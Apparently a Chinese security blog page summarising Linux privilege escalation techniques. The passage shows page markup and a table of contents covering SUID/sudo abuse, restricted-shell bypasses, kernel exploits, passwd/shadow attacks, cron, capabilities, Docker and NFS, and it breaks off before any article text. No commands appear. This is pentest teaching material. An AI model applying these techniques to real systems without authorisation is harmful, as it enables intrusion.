<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>linux提权总结 | sub esp,∞</title>
    <meta name="generator" content="VuePress 1.8.2">
    <script src="https://cdn.jsdelivr.net/npm/react/umd/react.production.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/react-dom/umd/react-dom.production.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@babel/standalone/babel.min.js"></script>
    <link rel="alternate" type="application/atom+xml" href="http://www.liuhanzhe.com/atom.xml" title="sub esp,∞ Atom Feed">
    <link rel="alternate" type="application/json" href="http://www.liuhanzhe.com/feed.json" title="sub esp,∞ JSON Feed">
    <link rel="alternate" type="application/rss+xml" href="http://www.liuhanzhe.com/rss.xml" title="sub esp,∞ RSS Feed">
    <link rel="icon" href="/favicon.ico">
    <link rel="icon" href="/assets/icon/logo.png" type="image/png" sizes="512x512">
    <link rel="icon" href="/assets/icon/logo.png" type="image/png" sizes="192x192">
    <link rel="icon" href="/assets/icon/logo.png" type="image/png" sizes="512x512">
    <link rel="icon" href="/assets/icon/logo.png" type="image/png" sizes="192x192">
    <link rel="manifest" href="/manifest.webmanifest" crossorigin="use-credentials">
    <link rel="apple-touch-icon" href="/assets/icon/logo.png">
    <meta name="description" content="">
    <meta property="og:url" content="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93.html">
    <meta property="og:site_name" content="sub esp,∞">
    <meta property="og:title" content="linux提权总结">
    <meta property="og:type" content="article">
    <meta property="og:locale" content="zh-CN">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image:alt" content="sub esp,∞">
    <meta property="article:author" content="lhz">
    <meta property="article:tag" content="渗透">
    <meta property="article:published_time" content="2021-08-18T00:00:00.000Z">
    <meta name="theme-color" content="#46bd87">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="msapplication-TileImage" content="/assets/icon/logo.png">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    
    <link rel="preload" href="/assets/css/0.styles.3335930c.css" as="style"><link rel="preload" href="/assets/js/app.def6d153.js" as="script"><link rel="preload" href="/assets/js/vendors~layout-Layout.309fb718.js" as="script"><link rel="preload" href="/assets/js/vendors~layout-Blog~layout-Layout~layout-NotFound.cc9ab5fb.js" as="script"><link rel="preload" href="/assets/js/page-linux提权总结.6ebb2f42.js" as="script"><link rel="preload" href="/assets/js/vendors~layout-Blog~layout-Layout~layout-NotFound~layout-Slide.863359a5.js" as="script"><link rel="prefetch" href="/assets/js/70.107d0aa8.js"><link rel="prefetch" href="/assets/js/71.706ed35d.js"><link rel="prefetch" href="/assets/js/72.8b6ecdc3.js"><link rel="prefetch" href="/assets/js/73.27d829cc.js"><link rel="prefetch" href="/assets/js/74.1b46872c.js"><link rel="prefetch" href="/assets/js/75.df10c76e.js"><link rel="prefetch" href="/assets/js/layout-Blog.819c6076.js"><link rel="prefetch" href="/assets/js/layout-Layout.d44c6185.js"><link rel="prefetch" href="/assets/js/layout-NotFound.0f5895ce.js"><link rel="prefetch" href="/assets/js/layout-Slide.32664a4e.js"><link rel="prefetch" href="/assets/js/mermaid.e5803e8b.js"><link rel="prefetch" href="/assets/js/page--03ebfda6.448b72e8.js"><link rel="prefetch" href="/assets/js/page-CTF.b3fe3fef.js"><link rel="prefetch" href="/assets/js/page-CTFHub-SSRF-Writeup.dce8a095.js"><link rel="prefetch" href="/assets/js/page-FunBlog.96325602.js"><link rel="prefetch" href="/assets/js/page-JAVA中jar包反编译再重新生成jar文件.08ec61c7.js"><link rel="prefetch" href="/assets/js/page-JWT破解工具.5d3779f4.js"><link rel="prefetch" href="/assets/js/page-SQL注入.252f4159.js"><link rel="prefetch" href="/assets/js/page-SSRF工具Gopherus.9008afda.js"><link rel="prefetch" href="/assets/js/page-XSSpayload.f7c197d6.js"><link rel="prefetch" href="/assets/js/page-nc.8b3ac3f0.js"><link rel="prefetch" href="/assets/js/page-nikto扫描工具.d3783607.js"><link rel="prefetch" href="/assets/js/page-wpscan.17eb599a.js"><link rel="prefetch" href="/assets/js/page-writeup.3498279c.js"><link rel="prefetch" href="/assets/js/page-业务安全测试.373499d3.js"><link rel="prefetch" href="/assets/js/page-主页.4092a70a.js"><link rel="prefetch" href="/assets/js/page-其他.b581d596.js"><link rel="prefetch" href="/assets/js/page-创建并破解confluence和markdown插件.f75302af.js"><link rel="prefetch" href="/assets/js/page-反弹shell.656b9993.js"><link rel="prefetch" href="/assets/js/page-命令收集.5f2ae164.js"><link rel="prefetch" href="/assets/js/page-图片隐写工具-stepic.68657f01.js"><link rel="prefetch" href="/assets/js/page-图片隐写查看工具-Stegsolve.7ed6899f.js"><link rel="prefetch" href="/assets/js/page-图片隐写检查工具-szteg.1ba56fb8.js"><link rel="prefetch" href="/assets/js/page-字典生成工具cewl.0cc7e909.js"><link rel="prefetch" href="/assets/js/page-密码破解工具Hashcat.f0611a3e.js"><link rel="prefetch" href="/assets/js/page-工具索引.0acf59f8.js"><link rel="prefetch" href="/assets/js/page-常用的提权扫描辅助工具总结.24f7c3bf.js"><link rel="prefetch" href="/assets/js/page-常见的勒索病毒解密工具.9f07fe54.js"><link rel="prefetch" href="/assets/js/page-文件包含.075a9a11.js"><link rel="prefetch" href="/assets/js/page-暴力破解工具hydra.8ee9ae7e.js"><link rel="prefetch" href="/assets/js/page-渗透.126d8e9c.js"><link rel="prefetch" href="/assets/js/page-版本控制文件泄露利用工具.e51a7312.js"><link rel="prefetch" href="/assets/js/page-索引.53c7e534.js"><link rel="prefetch" href="/assets/js/page-网站文件泄露.520a22aa.js"><link rel="prefetch" href="/assets/js/page-逆向.7082cffa.js"><link rel="prefetch" href="/assets/js/page-靶机.883fa505.js"><link rel="prefetch" href="/assets/js/page-靶机BSides-Vancouver-2018-WorkshopWalkthrough.3fa0d5ee.js"><link rel="prefetch" href="/assets/js/page-靶机DC1-writeup.e2f7291a.js"><link rel="prefetch" href="/assets/js/page-靶机DC2-writeup.89a8028c.js"><link rel="prefetch" href="/assets/js/page-靶机DC3-writeup.c065c1e6.js"><link rel="prefetch" href="/assets/js/page-靶机DC4-writeup.048b573d.js"><link rel="prefetch" href="/assets/js/page-靶机DC5-writeup.38008410.js"><link rel="prefetch" href="/assets/js/page-靶机DC6-writeup.891bba18.js"><link rel="prefetch" href="/assets/js/page-靶机DC7-writeup.fbfa9c2f.js"><link rel="prefetch" href="/assets/js/page-靶机DC8-writeup.4d83d175.js"><link rel="prefetch" href="/assets/js/page-靶机DC9-writeup.0e100d09.js"><link rel="prefetch" href="/assets/js/page-靶机KIOPTRIXLEVEL1Walkthrough.8802c268.js"><link rel="prefetch" href="/assets/js/page-靶机KIOPTRIXLEVEL2Walkthrough.2dc0b670.js"><link rel="prefetch" href="/assets/js/page-靶机KIOPTRIXLEVEL3Walkthrough.136358dd.js"><link rel="prefetch" href="/assets/js/page-靶机KIOPTRIXLEVEL4Walkthrough.9aa0b51a.js"><link rel="prefetch" href="/assets/js/page-靶机KIOPTRIXLEVEL5Walkthrough.42efa501.js"><link rel="prefetch" href="/assets/js/page-靶机Metasploitable1Walkthrough.7709e47d.js"><link rel="prefetch" href="/assets/js/page-靶机MrRobotsWalkthrough.09dc3bc1.js"><link rel="prefetch" href="/assets/js/page-靶机Stapler1Walkthrough.abacc18e.js"><link rel="prefetch" href="/assets/js/page-默认密码收集.ee738a06.js"><link rel="prefetch" href="/assets/js/vendors~flowchart.2f8491b6.js"><link rel="prefetch" href="/assets/js/vendors~mermaid.d5820f23.js"><link rel="prefetch" href="/assets/js/vendors~photo-swipe.1f69034c.js"><link rel="prefetch" href="/assets/js/vendors~reveal.4b3390cb.js"><link rel="prefetch" href="/assets/js/vendors~waline.a9ad062b.js">
    <link rel="stylesheet" href="/assets/css/0.styles.3335930c.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container has-navbar has-anchor"><header class="navbar"><!----> <div class="content__navbar-start"></div> <button title="Sidebar Button" class="sidebar-button"><span class="icon"></span></button> <a href="/" class="home-link router-link-active"><img src="/batman.jpg" alt="sub esp,∞" class="logo"> <!----> <span class="site-name can-hide">sub esp,∞</span></a> <!----> <div class="content__navbar-center"></div> <div class="links"><button tabindex="-1" aria-hidden="true" class="color-button"><svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" class="skin-icon"><path d="M224 800c0 9.6 3.2 44.8 6.4 54.4 6.4 48-48 76.8-48 76.8s80 41.6 147.2 0 134.4-134.4
        38.4-195.2c-22.4-12.8-41.6-19.2-57.6-19.2C259.2 716.8 227.2 761.6 224 800zM560 675.2l-32
        51.2c-51.2 51.2-83.2 32-83.2 32 25.6 67.2 0 112-12.8 128 25.6 6.4 51.2 9.6 80 9.6 54.4 0
        102.4-9.6 150.4-32l0 0c3.2 0 3.2-3.2 3.2-3.2 22.4-16 12.8-35.2
        6.4-44.8-9.6-12.8-12.8-25.6-12.8-41.6 0-54.4 60.8-99.2 137.6-99.2 6.4 0 12.8 0 22.4
        0 12.8 0 38.4 9.6 48-25.6 0-3.2 0-3.2 3.2-6.4 0-3.2 3.2-6.4 3.2-6.4 6.4-16 6.4-16 6.4-19.2
        9.6-35.2 16-73.6 16-115.2 0-105.6-41.6-198.4-108.8-268.8C704 396.8 560 675.2 560 675.2zM224
        419.2c0-28.8 22.4-51.2 51.2-51.2 28.8 0 51.2 22.4 51.2 51.2 0 28.8-22.4 51.2-51.2 51.2C246.4
        470.4 224 448 224 419.2zM320 284.8c0-22.4 19.2-41.6 41.6-41.6 22.4 0 41.6 19.2 41.6 41.6 0
        22.4-19.2 41.6-41.6 41.6C339.2 326.4 320 307.2 320 284.8zM457.6 208c0-12.8 12.8-25.6 25.6-25.6
        12.8 0 25.6 12.8 25.6 25.6 0 12.8-12.8 25.6-25.6 25.6C470.4 233.6 457.6 220.8 457.6 208zM128
        505.6C128 592 153.6 672 201.6 736c28.8-60.8 112-60.8 124.8-60.8-16-51.2 16-99.2
        16-99.2l316.8-422.4c-48-19.2-99.2-32-150.4-32C297.6 118.4 128 291.2 128 505.6zM764.8
        86.4c-22.4 19.2-390.4 518.4-390.4 518.4-22.4 28.8-12.8 76.8 22.4 99.2l9.6 6.4c35.2 22.4
        80 12.8 99.2-25.6 0 0 6.4-12.8 9.6-19.2 54.4-105.6 275.2-524.8 288-553.6
        6.4-19.2-3.2-32-19.2-32C777.6 76.8 771.2 80 764.8 86.4z"></path></svg> <div class="color-picker-menu" style="display:none;"><div class="theme-options"><ul class="themecolor-select"><label for="themecolor-select">主题色:</label> <li><span class="default-theme"></span></li> </ul> <!----></div></div></button> <div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link router-link-active"><i class="iconfont icon-home"></i>
  博客主页
</a></div><div class="nav-item"><a href="/docs/security/索引.html" class="nav-link"><i class="iconfont icon-anonymous"></i>
  安全
</a></div><div class="nav-item"><a href="/docs/其他/0.readme.html" class="nav-link"><i class="iconfont icon-editor"></i>
  其他
</a></div><div class="nav-item"><a href="/timeline/" class="nav-link"><i class="iconfont icon-time"></i>
  时间轴
</a></div></nav> <!----> <a rel="noopener noreferrer" href="https://github.com/lhzzzzzz/fun_blog" target="_blank" class="repo-link can-hide">
  GitHub
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> <!----> <div class="content__navbar-end"></div></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><!----> <!----> <div class="content__sidebar-top"></div> <nav class="sidebar-nav-links"><div class="nav-item"><a href="/" class="nav-link router-link-active"><i class="iconfont icon-home"></i>
  博客主页
</a></div><div class="nav-item"><a href="/docs/security/索引.html" class="nav-link"><i class="iconfont icon-anonymous"></i>
  安全
</a></div><div class="nav-item"><a href="/docs/其他/0.readme.html" class="nav-link"><i class="iconfont icon-editor"></i>
  其他
</a></div><div class="nav-item"><a href="/timeline/" class="nav-link"><i class="iconfont icon-time"></i>
  时间轴
</a></div> <a rel="noopener noreferrer" href="https://github.com/lhzzzzzz/fun_blog" target="_blank" class="repo-link">
  GitHub
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav> <!----> <div class="content__sidebar-center"></div> <!----> <!----> <div class="content__sidebar-bottom"></div> <!----></aside> <main class="page"><nav class="breadcrumb disable"><!----></nav> <!----> <div class="content__page-top"></div> <div vocab="https://schema.org/" typeof="Article" class="page-title"><h1><i class="iconfont icon-token"></i> <span property="headline">linux提权总结</span></h1> <div class="page-info"><!----> <span aria-label="作者🖊" data-balloon-pos="down"><svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" class="icon author-icon"><path d="M649.6 633.6c86.4-48 147.2-144 147.2-249.6 0-160-128-288-288-288s-288 128-288 288c0 108.8 57.6 201.6 147.2 249.6-121.6 48-214.4 153.6-240 288-3.2 9.6 0 19.2 6.4 25.6 3.2 9.6 12.8 12.8 22.4 12.8h704c9.6 0 19.2-3.2 25.6-12.8 6.4-6.4 9.6-16 6.4-25.6-25.6-134.4-121.6-240-243.2-288z" fill="currentColor"></path></svg> <span property="author">lhz</span></span><span aria-label="访问量🔢" data-balloon-pos="down" class="visitor-info"><svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" class="icon eye-icon"><path d="M992 512.096c0-5.76-.992-10.592-1.28-11.136-.192-2.88-1.152-8.064-2.08-10.816-.256-.672-.544-1.376-.832-2.08-.48-1.568-1.024-3.104-1.6-4.32C897.664 290.112 707.104 160 512 160c-195.072 0-385.632 130.016-473.76 322.592-1.056 2.112-1.792 4.096-2.272 5.856a55.512 55.512 0 0 0-.64 1.6c-1.76 5.088-1.792 8.64-1.632 7.744-.832 3.744-1.568 11.168-1.568 11.168-.224 2.272-.224 4.032.032 6.304 0 0 .736 6.464 1.088 7.808.128 1.824.576 4.512 1.12 6.976h-.032c.448 2.08 1.12 4.096 1.984 6.08.48 1.536.992 2.976 1.472 4.032C126.432 733.856 316.992 864 512 864c195.136 0 385.696-130.048 473.216-321.696 1.376-2.496 2.24-4.832 2.848-6.912.256-.608.48-1.184.672-1.728 1.536-4.48 1.856-8.32 1.728-8.32l-.032.032c.608-3.104 1.568-7.744 1.568-13.28zM512 672c-88.224 0-160-71.776-160-160s71.776-160 160-160 160 71.776 160 160-71.776 160-160 160z" fill="currentColor"></path></svg> <span id="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" data-flag-title="linux提权总结" class="leancloud_visitors"><span class="leancloud-visitors-count">...</span></span></span><span aria-label="写作日期📅" data-balloon-pos="down" class="time-info"><svg viewBox="0 0 1030 1024" xmlns="http://www.w3.org/2000/svg" class="icon calendar-icon"><path d="M716.4 110.137c0-18.753-14.72-33.473-33.472-33.473-18.753 0-33.473 14.72-33.473 33.473v33.473h66.993v-33.473zm-334.87 0c0-18.753-14.72-33.473-33.473-33.473s-33.52 14.72-33.52 33.473v33.473h66.993v-33.473zm468.81 33.52H716.4v100.465c0 18.753-14.72 33.473-33.472 33.473a33.145 33.145 0 0 1-33.473-33.473V143.657H381.53v100.465c0 18.753-14.72 33.473-33.473 33.473a33.145 33.145 0 0 1-33.473-33.473V143.657H180.6A134.314 134.314 0 0 0 46.66 277.595v535.756A134.314 134.314 0 0 0 180.6 947.289h669.74a134.36 134.36 0 0 0 133.94-133.938V277.595a134.314 134.314 0 0 0-133.94-133.938zm33.473 267.877H147.126a33.145 33.145 0 0 1-33.473-33.473c0-18.752 14.72-33.473 33.473-33.473h736.687c18.752 0 33.472 14.72 33.472 33.473a33.145 33.145 0 0 1-33.472 33.473z" fill="currentColor"></path></svg> <span property="datePublished">2021-08-18 </span></span><span role="navigation" aria-label="分类🌈" data-balloon-pos="down" class="category-info enable"><svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" class="icon category-icon"><path d="M148.41 106.992h282.176c22.263 0 40.31 18.048 40.31 40.31V429.48c0 22.263-18.047 40.31-40.31 40.31H148.41c-22.263 0-40.311-18.047-40.311-40.31V147.302c0-22.263 18.048-40.31 40.311-40.31zm-.854 446.486H429.73c22.263 0 40.311 18.048 40.311 40.31v282.176c0 22.263-18.048 40.312-40.31 40.312H147.555c-22.263 0-40.311-18.049-40.311-40.312V593.79c0-22.263 18.048-40.311 40.31-40.311zm446.371-446.486h282.176c22.263 0 40.31 18.048 40.31 40.31V429.48c0 22.263-18.047 40.31-40.31 40.31H593.927c-22.263 0-40.311-18.047-40.311-40.31V147.302c0-22.263 18.048-40.31 40.31-40.31zm136.293 813.51H623.926c-40.925 0-74.22-33.388-74.22-74.425V623.992c0-41.038 33.387-74.424 74.425-74.424h222.085c41.038 0 74.424 33.226 74.424 74.067v114.233c0 10.244-8.304 18.548-18.547 18.548s-18.548-8.304-18.548-18.548V623.635c0-20.388-16.746-36.974-37.33-36.974H624.13c-20.585 0-37.331 16.747-37.331 37.33v222.086c0 20.585 16.654 37.331 37.126 37.331H730.22c10.243 0 18.547 8.304 18.547 18.547 0 10.244-8.304 18.547-18.547 18.547z" fill="currentColor"></path></svg> <span property="articleSection">渗透</span></span><span aria-label="标签🏷" data-balloon-pos="down"><svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" class="icon tag-icon"><path d="M939.902 458.563 910.17 144.567c-1.507-16.272-14.465-29.13-30.737-30.737L565.438 84.098h-.402c-3.215 0-5.726 1.005-7.634 2.913l-470.39 470.39a10.004 10.004 0 0 0 0 14.164l365.423 365.424c1.909 1.908 4.42 2.913 7.132 2.913s5.223-1.005 7.132-2.913l470.39-470.39c2.01-2.11 3.014-5.023 2.813-8.036zm-240.067-72.121c-35.458 0-64.286-28.828-64.286-64.286s28.828-64.285 64.286-64.285 64.286 28.828 64.286 64.285-28.829 64.286-64.286 64.286z" fill="currentColor"></path></svg> <ul class="tags-wrapper"><li class="tag clickable tag0"><span role="navigation">渗透</span></li><li class="tag clickable tag1"><span role="navigation">提权</span></li></ul> <meta property="keywords" content="渗透,提权"></span><span aria-label="阅读时间⌛" data-balloon-pos="down" class="reading-time-info"><svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" class="icon timer-icon"><path d="M799.387 122.15c4.402-2.978 7.38-7.897 7.38-13.463v-1.165c0-8.933-7.38-16.312-16.312-16.312H256.33c-8.933 0-16.311 7.38-16.311 16.312v1.165c0 5.825 2.977 10.874 7.637 13.592 4.143 194.44 97.22 354.963 220.201 392.763-122.204 37.542-214.893 196.511-220.2 389.397-4.661 5.049-7.638 11.651-7.638 19.03v5.825h566.49v-5.825c0-7.379-2.849-13.981-7.509-18.9-5.049-193.016-97.867-351.985-220.2-389.527 123.24-37.67 216.446-198.453 220.588-392.892zM531.16 450.445v352.632c117.674 1.553 211.787 40.778 211.787 88.676H304.097c0-48.286 95.149-87.382 213.728-88.676V450.445c-93.077-3.107-167.901-81.297-167.901-177.093 0-8.803 6.99-15.793 15.793-15.793 8.803 0 15.794 6.99 15.794 15.793 0 80.261 63.69 145.635 142.01 145.635s142.011-65.374 142.011-145.635c0-8.803 6.99-15.793 15.794-15.793s15.793 6.99 15.793 15.793c0 95.019-73.789 172.82-165.96 177.093z" fill="currentColor"></path></svg> <span>大约 10 分钟</span> <meta property="timeRequired" content="PT10M"></span></div> <!----> <hr></div> <div class="anchor-place-holder"><aside id="anchor"><div class="anchor-wrapper"><ul class="anchor-list"><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#一-sudo-和-suid-提权" class="anchor-link heading2"><div>一. sudo 和 suid 提权</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_1-何为suid" class="anchor-link heading3"><div>1. 何为suid</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_2-sudo" class="anchor-link heading3"><div>2. sudo</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_3-suid与sudo提权" class="anchor-link heading3"><div>3. SUID与sudo提权</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#遍历目录中的suid文件" class="anchor-link heading3"><div>遍历目录中的suid文件</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#用sudo-l-查看哪些命令能被sudo" class="anchor-link heading3"><div>用sudo -l 查看哪些命令能被sudo</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_4-sudo-i" class="anchor-link heading3"><div>4. sudo -i</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#可利用于提权的命令" class="anchor-link heading3"><div>可利用于提权的命令</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#二-rbash-绕过" class="anchor-link heading2"><div>二. rbash 绕过</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_1-何为rbash" class="anchor-link heading3"><div>1. 何为rbash</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_2-bypass" class="anchor-link heading3"><div>2. bypass</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#scp-bypass" class="anchor-link heading3"><div>scp bypass</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_3-进入命令自带shell-bypass" class="anchor-link heading3"><div>3. 进入命令自带shell bypass</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_4-find-bypasss" class="anchor-link heading3"><div>4 find bypasss</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_5-编程语言-bypass" class="anchor-link heading3"><div>5 编程语言 bypass</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_6-cp-bypass" class="anchor-link heading3"><div>6. cp bypass</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_7-直接更改path-shell变量" class="anchor-link heading3"><div>7. 直接更改PATH/SHELL变量</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_8-ssh-bypass" class="anchor-link heading3"><div>8. ssh bypass</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_9-echo-bypass" class="anchor-link heading3"><div>9. echo bypass</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#三-内核提权" class="anchor-link heading2"><div>三. 内核提权</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#四-passwd和shadow" class="anchor-link heading2"><div>四. passwd和shadow</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_1-明文密码" class="anchor-link heading3"><div>1. 明文密码</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_2-passwd-可写" class="anchor-link heading3"><div>2. passwd 可写</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_3-爆破shadow" class="anchor-link heading3"><div>3. 爆破shadow</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#五-计划任务" class="anchor-link heading2"><div>五. 计划任务</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_1-文件重写" class="anchor-link heading3"><div>1. 文件重写</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_2-环境变量劫持" class="anchor-link heading3"><div>2. 环境变量劫持</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_3-通配符提权" class="anchor-link heading3"><div>3. 通配符提权</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#六-环境变量" class="anchor-link heading2"><div>六. 环境变量</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#七-密码查找" class="anchor-link heading2"><div>七. 密码查找</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_1-文件内查找" class="anchor-link heading3"><div>1. 文件内查找</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_2-查找十分钟内更改过的文件" class="anchor-link heading3"><div>2. 查找十分钟内更改过的文件</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#八-capabilities" class="anchor-link heading2"><div>八. capabilities</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_1-简介" class="anchor-link heading3"><div>1. 简介</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_2-实操" class="anchor-link heading3"><div>2. 实操</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#通过cap-setuid" class="anchor-link heading3"><div>通过cap_setuid</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#通过cap-dac-read-search" class="anchor-link heading3"><div>通过CAPDACREAD_SEARCH</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#九-docker" class="anchor-link heading2"><div>九. Docker</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_1-docker用户组提权" class="anchor-link heading3"><div>1. Docker用户组提权</div></a></li><li class="anchor"><a href="/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_0x0a-nfs" class="anchor-link heading2"><div>0x0a NFS</div></a></li><li class="anchor"><a 